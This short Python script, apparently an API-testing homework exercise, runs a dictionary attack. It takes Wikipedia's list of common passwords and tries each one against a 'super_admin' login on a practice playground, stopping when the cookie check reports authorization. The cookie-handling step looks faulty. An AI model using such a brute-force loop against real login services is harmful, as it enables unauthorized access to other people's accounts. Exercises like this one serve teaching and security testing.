#
import pandas as pd
import requests
#
url_secret = 'https://playground.learnqa.ru/ajax/api/get_secret_password_homework'
url_check_password_coocke = 'https://playground.learnqa.ru/ajax/api/check_auth_cookie'
url_list_password = 'https://en.wikipedia.org/wiki/List_of_the_most_common_passwords'
#
tables = pd.read_html(url_list_password)
aa = tables[1]
#
a1 = aa['2019[13]'][:]
a2 = a1.tolist()
for a3 in a2:
  login = {'login': 'super_admin','password': '111'}
  login['password'] = a3
  connect_1 = requests.post(url_secret,data=login)
  aaa = connect_1.headers['Set-Cookie']
  print(login)
  print(aaa)
  check_coocke = requests.post(url_check_password_coocke,data=aaa)
  print(check_coocke.text)
  if check_coocke.text != "You are authorized":
          print('No?')
  else:
          print('Yes')
          break
          



        
        
        


